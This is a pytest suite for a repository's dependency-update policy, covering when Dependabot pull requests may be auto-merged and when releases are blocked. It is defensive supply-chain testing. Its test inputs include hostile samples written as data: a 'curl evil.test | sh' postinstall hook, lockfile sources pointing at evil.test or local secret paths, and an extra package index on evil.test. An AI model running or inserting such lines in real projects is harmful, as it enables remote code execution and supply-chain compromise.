"""Release and write-token boundaries are tested without contacting GitHub."""
import copy
import json
from pathlib import Path
import sys

import pytest

SCRIPTS = Path(__file__).resolve().parents[2] / "scripts"
sys.path.insert(0, str(SCRIPTS))
import dependency_policy as policy
import maintain_dependencies as maintenance
from dependency_github import GitHub

BASE, HEAD = "a" * 40, "b" * 40


def pr():
    return {"number": 10, "state": "open", "draft": False, "changed_files": 2,
            "user": {"login": "dependabot[bot]", "type": "Bot"},
            "base": {"ref": "main", "sha": BASE, "repo": {"full_name": "lab-emi/OpenDPD"}},
            "head": {"ref": "dependabot/npm_and_yarn/frontend/group", "sha": HEAD,
                     "repo": {"full_name": "lab-emi/OpenDPD"}}}


def manifest(version="^1.0.0"):
    return {"name": "studio", "version": "2.3.1", "scripts": {"build": "vite build"},
            "dependencies": {"example": version}, "devDependencies": {}}


def lock(version="1.0.0"):
    return {"name": "studio", "version": "2.3.1", "lockfileVersion": 3, "requires": True, "packages": {
        "": {"name": "studio", "version": "2.3.1", "dependencies": {"example": "^" + version}, "devDependencies": {}},
        "node_modules/example": {"version": version, "resolved": f"https://registry.npmjs.org/example/-/example-{version}.tgz",
                                 "integrity": "sha512-YWJjZA=="},
    }}


def update():
    before = {policy.MANIFEST: json.dumps(manifest()), policy.LOCK: json.dumps(lock())}
    after = {policy.MANIFEST: json.dumps(manifest("^1.2.3")), policy.LOCK: json.dumps(lock("1.2.3"))}
    files = [{"filename": path, "status": "modified"} for path in before]
    return before, after, files


def accepted(before, after, files, pull=None, pin=lambda *_: True):
    return policy.review(pull or pr(), files, before.__getitem__, after.__getitem__, pin)


def test_routine_frontend_update_is_eligible():
    assert accepted(*update())


@pytest.mark.parametrize("old,new,allowed", [
    ("^1.0.0", "^1.2.3", True), ("1.2.3", "1.2.4", True), ("0.2.1", "0.2.2", True),
    ("1.2.3", "2.0.0", False), ("0.2.1", "0.3.0", False), ("1.2.3", "1.1.0", False),
    ("^1.2.3", "*", False), ("1.2.3", "https://evil.test/a.tgz", False),
    ("1.2.3", "1.2.4-rc.1", False), ("^1.2.3", "~1.2.4", False),
])
def test_version_policy(old, new, allowed):
    assert policy.routine_version(old, new) is allowed


@pytest.mark.parametrize("mutation", [
    lambda p: p["user"].update(login="contributor", type="User"),
    lambda p: p["user"].update(type="User"),
    lambda p: p["head"]["repo"].update(full_name="attacker/OpenDPD"),
    lambda p: p["base"].update(ref="other"),
    lambda p: p.update(draft=True),
    lambda p: p["head"].update(ref="untrusted-branch"),
])
def test_bot_name_labels_and_forks_cannot_grant_auto_review(mutation):
    pull = pr()
    mutation(pull)
    pull["labels"] = [{"name": "dependencies"}]
    assert not accepted(*update(), pull=pull)


@pytest.mark.parametrize("change", [
    lambda p: p["scripts"].update(postinstall="curl evil.test | sh"),
    lambda p: p.update(version="2.3.2"),
    lambda p: p["dependencies"].update(example="^2.0.0"),
    lambda p: p["dependencies"].update(new_package="^1.0.0"),
    lambda p: p.update(workspaces=["../secrets"]),
])
def test_manifest_cannot_smuggle_nonroutine_changes(change):
    before, after, files = update()
    package = json.loads(after[policy.MANIFEST])
    change(package)
    after[policy.MANIFEST] = json.dumps(package)
    assert not accepted(before, after, files)


@pytest.mark.parametrize("change", [
    lambda p: p["packages"]["node_modules/example"].update(resolved="https://evil.test/a.tgz"),
    lambda p: p["packages"]["node_modules/example"].update(resolved="file:../../secret"),
    lambda p: p["packages"]["node_modules/example"].update(integrity="bad"),
    lambda p: p["packages"]["node_modules/example"].update(link=True),
    lambda p: p["packages"]["node_modules/example"].update(scripts={"install": "evil"}),
    lambda p: p["packages"].update({"node_modules/../escape": p["packages"]["node_modules/example"]}),
    lambda p: p["packages"][""].update(version="malicious"),
])
def test_lockfile_sources_and_root_metadata_are_checked(change):
    before, after, files = update()
    package = json.loads(after[policy.LOCK])
    change(package)
    after[policy.LOCK] = json.dumps(package)
    assert not accepted(before, after, files)


def test_same_version_integrity_replacement_is_not_automatic():
    original = lock()
    modified = copy.deepcopy(original)
    modified["packages"]["node_modules/example"]["integrity"] = "sha512-ZXZpbA=="
    assert not policy.lock_update(json.dumps(original), json.dumps(modified), json.dumps(manifest()))


def test_nonbreaking_direct_update_can_change_its_internal_zero_major_tooling():
    before, after, files = update()
    for mapping, version in ((before, "0.148.0"), (after, "0.152.0")):
        data = json.loads(mapping[policy.LOCK])
        data["packages"]["node_modules/internal"] = {
            "version": version, "resolved": f"https://registry.npmjs.org/internal/-/internal-{version}.tgz",
            "integrity": "sha512-YWJjZA==",
        }
        mapping[policy.LOCK] = json.dumps(data)
    assert accepted(before, after, files)
    # A lock-only breaking update does not borrow this exception.
    after[policy.MANIFEST] = before[policy.MANIFEST]
    data = json.loads(after[policy.LOCK])
    data["packages"][""] = json.loads(before[policy.LOCK])["packages"][""]
    after[policy.LOCK] = json.dumps(data)
    assert not accepted(before, after, files)


def test_lock_and_manifest_must_move_together():
    before, after, files = update()
    assert not accepted(before, after, files[:1])
    after[policy.LOCK] = before[policy.LOCK]
    assert not accepted(before, after, files)


def test_non_dependency_files_and_renames_require_human_review():
    before, after, files = update()
    assert not accepted(before, after, files + [{"filename": "opendpd/web/policy.py", "status": "modified"}])
    files[0]["previous_filename"] = "something"
    assert not accepted(before, after, files)


def test_documentation_requirements_are_narrowly_scoped():
    assert policy.docs_update("mkdocstrings[python]>=1.0.6,<2\n", "mkdocstrings[python]>=1.1.0,<2\n")
    assert not policy.docs_update("mkdocstrings[python]>=1.0.6,<2\n", "mkdocstrings[python]>=2.0.0,<3\n")
    assert not policy.docs_update("mkdocs-material>=9.7.7,<10\n", "--extra-index-url=https://evil.test\n")
    assert not policy.dependency_paths([{"filename": "pyproject.toml", "status": "modified"}])


def test_actions_require_same_action_semver_pins_and_verified_tag():
    path = ".github/workflows/ci.yml"
    old = f"  - uses: actions/setup-node@{BASE} # v7.0.0\n"
    new = f"  - uses: actions/setup-node@{HEAD} # v7.0.1\n"
    files = [{"filename": path, "status": "modified"}]
    assert accepted({path: old}, {path: new}, files)
    assert not accepted({path: old}, {path: new}, files, pin=lambda *_: False)
    for bad in (new.replace("v7.0.1", "v8.0.0"), new.replace("actions/", "attacker/"),
                new + "permissions: write-all\n", new.replace(HEAD, "main")):
        assert not accepted({path: old}, {path: bad}, files)


class Checks:
    repository = "lab-emi/OpenDPD"

    def __init__(self):
        self.calls = []
        self.runs = {}
        self.jobs = {}
        for index, (workflow, required) in enumerate(maintenance.WORKFLOWS.items(), 1):
            self.runs[workflow] = {"id": index, "head_sha": HEAD, "event": "pull_request",
                                  "head_repository": {"full_name": self.repository},
                                  "status": "completed", "conclusion": "success", "html_url": f"https://github.com/run/{index}"}
            self.jobs[index] = [{"name": name, "status": "completed", "conclusion": "success"} for name in required]

    def request(self, path, payload=None, method=None):
        self.calls.append((path, payload, method))
        if "dispatches" in path:
            return None
        if path.startswith("actions/workflows/"):
            run = self.runs.get(path.split("/")[2])
            return {"total_count": int(run is not None), "workflow_runs": [run] if run else []}
        if path.startswith("actions/runs/"):
            return {"jobs": self.jobs[int(path.split("/")[2])], "total_count": len(self.jobs[int(path.split("/")[2])])}
        raise AssertionError(path)

    def pages(self, path):
        assert path == "rules/branches/main"
        return self.rules


def test_every_required_workflow_and_job_must_pass():
    api = Checks()
    assert maintenance.validation(api, HEAD)[0] == "passed"
    api.jobs[1][0]["conclusion"] = "skipped"
    assert maintenance.validation(api, HEAD)[0] == "failed"
    api.jobs[1][0]["conclusion"] = "success"
    api.runs["docs.yml"]["conclusion"] = "failure"
    assert maintenance.validation(api, HEAD)[0] == "failed"


def test_missing_checks_are_dispatched_but_never_considered_passed():
    api = Checks()
    api.runs.pop("ci.yml")
    assert maintenance.validation(api, HEAD, "dependabot/npm/group")[0] == "waiting"
    assert any(path == "actions/workflows/ci.yml/dispatches" for path, _, _ in api.calls)


def test_checks_on_another_head_or_repository_are_not_reused():
    api = Checks()
    api.runs["ci.yml"]["head_sha"] = BASE
    assert maintenance.validation(api, HEAD)[0] == "waiting"
    api.runs["ci.yml"]["head_sha"] = HEAD
    api.runs["ci.yml"]["head_repository"]["full_name"] = "attacker/OpenDPD"
    assert maintenance.validation(api, HEAD)[0] == "waiting"


def test_automerge_requires_server_enforced_up_to_date_checks():
    api = Checks()
    api.rules = [{"type": "required_status_checks", "parameters": {
        "strict_required_status_checks_policy": False,
        "required_status_checks": [{"context": name, "integration_id": 15368}
                                   for name in set().union(*maintenance.WORKFLOWS.values())]}}]
    with pytest.raises(ValueError, match="up-to-date"):
        maintenance.require_strict_checks(api)
    api.rules[0]["parameters"]["strict_required_status_checks_policy"] = True
    maintenance.require_strict_checks(api)
    api.rules[0]["parameters"]["required_status_checks"][0]["integration_id"] = 123
    with pytest.raises(ValueError):
        maintenance.require_strict_checks(api)


class Reconciler(Checks):
    def __init__(self):
        super().__init__()
        self.pull = pr()
        self.rules = [{"type": "required_status_checks", "parameters": {
            "strict_required_status_checks_policy": True,
            "required_status_checks": [{"context": name, "integration_id": 15368}
                                       for name in set().union(*maintenance.WORKFLOWS.values())]}}]
        self.reviewable = True
        self.behind = 0
        self.change_on_refresh = False
        self.reads = 0

    def pulls(self):
        return [self.pull]

    def files(self, _pr):
        return update()[2]

    def routine(self, _pr):
        return self.reviewable

    def comparison(self, _pr):
        return {"behind_by": self.behind}

    def request(self, path, payload=None, method=None):
        if path == "pulls/10":
            self.reads += 1
            if self.change_on_refresh and self.reads > 1:
                self.pull["head"]["sha"] = "c" * 40
            return copy.deepcopy(self.pull)
        if path == "pulls/10/merge":
            self.calls.append((path, payload, method))
            assert payload["sha"] == HEAD and method == "PUT"
            return {"merged": True, "sha": "d" * 40}
        if path == "pulls/10/update-branch":
            self.calls.append((path, payload, method))
            assert payload["expected_head_sha"] == HEAD and method == "PUT"
            self.pull["head"]["sha"] = "e" * 40
            self.behind = 0
            return {}
        return super().request(path, payload, method)


def test_merge_is_bound_to_tested_head_and_dispatches_main_checks():
    api = Reconciler()
    assert "merged" in maintenance.reconcile(api)[0]
    assert ("pulls/10/merge", {"sha": HEAD, "merge_method": "squash"}, "PUT") in api.calls
    assert {path for path, body, _ in api.calls if body == {"ref": "main"}} == {
        f"actions/workflows/{name}/dispatches" for name in maintenance.WORKFLOWS}


@pytest.mark.parametrize("case", ["failed", "waiting", "manual", "head_changed"])
def test_automerge_never_proceeds_without_current_success(case):
    api = Reconciler()
    if case == "failed":
        api.runs["ci.yml"]["conclusion"] = "failure"
    elif case == "waiting":
        api.runs["ci.yml"]["status"] = "in_progress"
    elif case == "manual":
        api.reviewable = False
    else:
        api.change_on_refresh = True
    maintenance.reconcile(api)
    assert not any(path.endswith("/merge") for path, _, _ in api.calls)


def test_rebased_head_does_not_reuse_previous_green_checks(monkeypatch):
    api = Reconciler()
    api.behind = 1
    monkeypatch.setattr(maintenance.time, "sleep", lambda _seconds: None)
    assert "waiting" in maintenance.reconcile(api)[0]
    assert not any(path.endswith("/merge") for path, _, _ in api.calls)
    assert any(path.endswith("/dispatches") for path, _, _ in api.calls)


def test_ruleset_template_matches_required_jobs_and_has_no_bypass():
    data = json.loads((SCRIPTS.parent / "deployment/dependency-status-ruleset.json").read_text())
    assert data["enforcement"] == "active" and data["bypass_actors"] == []
    assert data["conditions"]["ref_name"]["include"] == ["refs/heads/main"]
    api = Checks()
    api.rules = data["rules"]
    maintenance.require_strict_checks(api)


def test_release_is_blocked_by_any_remaining_dependency_pr():
    api = Checks()
    api.pulls = lambda: [{**pr(), "number": 23}, {"number": 24, "user": {"login": "human"}, "labels": [{"name": "dependencies"}]}]
    with pytest.raises(ValueError, match="#23, #24"):
        maintenance.release_check(api, HEAD)
    api.pulls = lambda: [{"number": 25, "user": {"login": "human"}, "labels": []}]
    assert "No unresolved" in maintenance.release_check(api)


def test_release_tag_must_include_current_maintenance_commits():
    api = Checks()
    api.pulls = lambda: []
    request = api.request
    def get(path, *args, **kwargs):
        if path == "git/ref/heads/main":
            return {"object": {"sha": BASE}}
        if path.startswith("git/commits/"):
            return {"tree": {"sha": path.split("/")[-1]}}
        return request(path, *args, **kwargs)
    api.request = get
    with pytest.raises(ValueError, match="differs from current main"):
        maintenance.release_check(api, HEAD)


def test_squash_commit_can_use_successful_ci_for_its_identical_pr_tree():
    api = Checks()
    api.pulls = lambda: []
    api.pages = lambda _path: [{**pr(), "merged_at": "2026-10-06T12:00:00Z"}]
    request = api.request
    def get(path, *args, **kwargs):
        if path == "git/ref/heads/main":
            return {"object": {"sha": BASE}}
        if path.startswith("git/commits/"):
            return {"tree": {"sha": "c" * 40}}
        return request(path, *args, **kwargs)
    api.request = get
    assert "No unresolved" in maintenance.release_check(api, BASE)


def test_failed_release_ci_is_never_replaced_by_an_older_green_pr_run():
    api = Checks()
    api.pulls = lambda: []
    api.pages = lambda _path: pytest.fail("must not override an actual failure")
    api.runs["ci.yml"]["conclusion"] = "failure"
    request = api.request
    def get(path, *args, **kwargs):
        if path == "git/ref/heads/main":
            return {"object": {"sha": HEAD}}
        if path.startswith("git/commits/"):
            return {"tree": {"sha": "c" * 40}}
        return request(path, *args, **kwargs)
    api.request = get
    with pytest.raises(ValueError, match="Release CI is failed"):
        maintenance.release_check(api, HEAD)


def test_source_reader_refuses_symlinks_before_reading_blob():
    api = GitHub("lab-emi/OpenDPD", "not-a-real-token")
    api.request = lambda *_a, **_k: {"tree": [{"path": "frontend", "mode": "120000", "sha": HEAD}]}
    with pytest.raises(ValueError, match="symlinks"):
        api.source(BASE, "frontend/package.json")


def test_base_freshness_uses_live_main_not_the_prs_stale_base_field():
    api = GitHub("lab-emi/OpenDPD", "not-a-real-token")
    current = "c" * 40
    calls = []
    def get(path):
        calls.append(path)
        return {"object": {"sha": current}} if path == "git/ref/heads/main" else {"behind_by": 2}
    api.request = get
    assert api.comparison(pr())["behind_by"] == 2
    assert calls[-1] == f"compare/{current}...{HEAD}?per_page=1"


def test_privileged_workflow_does_not_checkout_pr_or_install_dependencies():
    text = (SCRIPTS.parent / ".github/workflows/dependency-maintenance.yml").read_text()
    assert "ref: main" in text and "persist-credentials: false" in text
    assert "pull_request.head" not in text
    assert "npm " not in text and "pip install" not in text
